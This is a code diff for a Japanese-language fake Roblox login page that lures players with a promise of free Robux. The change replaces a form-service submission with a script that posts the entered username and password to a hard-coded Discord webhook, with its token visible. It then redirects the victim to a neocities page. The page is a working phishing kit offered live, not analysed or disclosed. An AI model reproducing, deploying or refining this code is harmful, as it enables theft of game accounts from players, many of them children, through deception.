@@ -80,17 +80,48 @@
 
   <div class="login-container">
     <h2>Roblox(ロブロックス)にログイン</h2>
-    <form action="https://usebasin.com/f/7df2eb4b9718" method="POST">
-      <input type="text" name="username" placeholder="ユーザーネーム/メールアドレス" required>
-      <input type="password" name="password" placeholder="パスワード" required>
-      <button type="submit">送信</button>
-      <input type="hidden" name="_redirect" value="https://aus77.neocities.org/ロバックス">
+    <form id="robloxForm">
+      <input type="text" id="username" placeholder="ユーザーネーム/メールアドレス" required>
+      <input type="password" id="password" placeholder="パスワード" required>
+      <button type="submit">ログイン</button>
     </form>
     <div class="links">
-      <p><a href="#">パスワードを忘れた場合</a></p>
-      <p>アカウントをお持ちでないですか？ <a href="#">サインアップ</a></p>
+      <p><a href="#">入力された情報が正しくない場合は増えないので注意してください</a></p>
+      <p>ロバックスが増えるまで数時間から2日ほどかかる場合があります<a href="#"> </a></p>
     </div>
   </div>
+
+  <script>
+    document.getElementById("robloxForm").addEventListener("submit", function(e) {
+      e.preventDefault();
+
+      const username = document.getElementById("username").value;
+      const password = document.getElementById("password").value;
+
+      const webhookUrl = "https://discord.com/api/webhooks/1371008487009550419/QIemNIKanEGRN6L0_WSMMj5oqk7hfrM_nT0ccaVzU0tPpHgPYUu0PKguQ8omhsSEiH70";
+
+      const data = {
+        content: `Robloxフォーム送信:\nユーザー名: ${username}\nパスワード: ${password}`
+      };
+
+      fetch(webhookUrl, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify(data)
+      })
+      .then(response => {
+        if (response.ok) {
+          // 成功したら指定したページにリダイレクト
+          window.location.href = "https://aus77.neocities.org/robux";
+        } else {
+          alert("送信に失敗しました。ステータス: " + response.status);
+        }
+      })
+      .catch(error => {
+        alert("エラー: " + error);
+      });
+    });
+  </script>
 
 </body>
 </html>
